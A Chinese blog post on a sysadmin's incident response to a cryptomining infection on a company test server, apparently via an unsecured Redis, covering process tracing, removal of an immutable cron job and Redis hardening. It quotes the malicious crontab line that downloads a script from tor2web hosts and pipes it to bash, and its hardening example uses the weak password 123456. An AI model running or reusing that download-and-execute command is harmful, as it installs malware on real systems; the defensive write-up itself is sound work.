---
title: 服务器中挖矿病毒
date: 2018-10-19 12:59:58
tags: [ redis,挖矿 ]
categories: [Linux-Basic ]
comments: true
copyright: true
---

## BETA服务器中毒案例

周末发现公司的BETA服务器占用CPU非常非常高.利用htop查看发现一个很奇怪的进程名:ZXGcBt

第一直觉就是服务器可能遭受了攻击,被植入了可疑程序.

---

### 解决步骤:

<!--more-->

1.试图找出该进程的父进程:

ps -ef | grep -i ZXGcBt

结果显示父进程为1.看来是一个独立的进程

2.通过该进程的PID找出该进程打开的文件,也就是程序的所在路径

```
[work@DWD-BETA ~]$ sudo lsof -p 27493
COMMAND   PID USER   FD   TYPE     DEVICE SIZE/OFF       NODE NAME
ZXGcBt  27493 root  cwd    DIR      253,1     4096          2 /
ZXGcBt  27493 root  rtd    DIR      253,1     4096          2 /
ZXGcBt  27493 root  txt    REG      253,1   198140     924524 /root/.x (deleted)
ZXGcBt  27493 root    0r  FIFO        0,8      0t0 1782547852 pipe
ZXGcBt  27493 root    1w   CHR        1,3      0t0       1028 /dev/null
ZXGcBt  27493 root    2w   CHR        1,3      0t0       1028 /dev/null
ZXGcBt  27493 root    3w   REG      253,1        6    2494781 /tmp/.X11-lock
ZXGcBt  27493 root    5u  IPv4 1788320222      0t0        TCP DWD-BETA:46392->37.59.44.93:http (ESTABLISHED)
```
可以看到该进程发起了一个http的链接.访问外部的http服务器

3.查看实际进程的符号链接

```
[work@DWD-BETA ~]$ sudo ls -l /proc/27493/exe
lrwxrwxrwx 1 root root 0 Oct 20 17:46 /proc/27493/exe -> /root/.x (deleted)
```

4.查看定时任务,看看有没有什么可疑的自动运行程序

```
[work@DWD-BETA ~]$ sudo crontab -l
49 * * * * (wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.io/i.sh||wget -qO- -U- http://ddgsdk6oou6znsdn.tor2web.me/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.onion.ws/i.sh)|bash
```
发现个非常可疑的定时任务.该任务会定期从网上下载i.sh脚本.然后用bash执行

5.删除这个定时任务

```
[work@DWD-BETA ~]$ sudo crontab -e
crontab: installing new crontab
crontab: error renaming /var/spool/cron/#tmp.DWD-BETA.XXXXAzSEpy to /var/spool/cron/root
rename: Operation not permitted
crontab: edits left in /tmp/crontab.TIdire
[work@DWD-BETA ~]$ sudo crontab -l
49 * * * * (wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.io/i.sh||wget -qO- -U- http://ddgsdk6oou6znsdn.tor2web.me/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.tor2web.xyz/i.sh||wget -qO- -U- https://ddgsdk6oou6znsdn.onion.ws/i.sh)|bash
```
在crontab -e的命令行界面无法删除.

6.尝试删除crontab文件.也提示没有权限
```
[root@DWD-BETA ~]# ls -l /var/spool/cron/root 
-rw------- 1 root root 239 Oct 20 00:01 /var/spool/cron/root
[root@DWD-BETA ~]# vim /var/spool/cron/root 
[root@DWD-BETA ~]# rm -rf /var/spool/cron/root
rm: cannot remove ‘/var/spool/cron/root’: Operation not permitted
```

7.通过lsattr发现该文件有隐藏的i属性
```
[root@DWD-BETA ~]# lsattr /var/spool/cron/root
----i--------e-- /var/spool/cron/root
```

8.去掉隐藏属性.删除该文件.
```
[root@DWD-BETA ~]# chattr -i /var/spool/cron/root
[root@DWD-BETA ~]# lsattr /var/spool/cron/root
-------------e-- /var/spool/cron/root
[root@DWD-BETA ~]# rm -rf /var/spool/cron/root
[root@DWD-BETA ~]# ls -l /var/spool/cron/root 
ls: cannot access /var/spool/cron/root: No such file or directory
```
> note:最好是进入crontab -e界面清空定时任务.而不是直接删除crontab文件

9.删除该进程.发现该进程已经消失..而且CPU使用率大幅下降,回到正常
```
ps -ef | grep -i zxgcbt
```

---

### 利用ansible检查其他所有服务器的定时任务,查看是否有可疑脚本

```
ansible allserver -m shell -a  'crontab -l'
ansible allserver -m shell -a  "su - work -c 'crontab -l'"
```


---

网上搜了一下我的案例,发现很多人和我有同样的经历,并且都是通过redis的漏洞取得权限.

### 加固redis的安全性

1.修改侦听地址.最好不要侦听外网接口
2.给redis设置密码
3.修改默认侦听端口

编辑redis.cnf配置文件

```
[work@DWD-BETA ~]$ sudo vim /etc/redis.conf
#修改侦听地址为127.0.0.1.只允许本机访问
bind 127.0.0.1

#设置一个密码.密码为123456
requirepass 123456
```
重启redis进程.

此时就需要先验证密码:

```
[work@DWD-BETA ~]$ redis-cli
127.0.0.1:6379> select 0
(error) NOAUTH Authentication required.
127.0.0.1:6379> auth 123456
OK
127.0.0.1:6379>
```